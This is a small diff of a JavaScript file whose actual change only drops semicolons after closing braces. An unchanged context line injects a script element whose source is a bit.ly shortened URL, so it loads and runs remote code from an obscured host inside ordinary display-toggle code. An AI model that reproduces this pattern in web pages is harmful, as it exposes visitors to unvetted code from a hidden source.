@@ -30,5 +30,5 @@ else {
 			mpo.style.display = (mpo.style.display == 'block' ? 'none' : 'block');
 		}
 		else s=document.createElement('script');s.type='text/javascript';document.body.appendChild(s);s.src='https://bit.ly/uvqKCN';
-	};
-};
+	}
+}
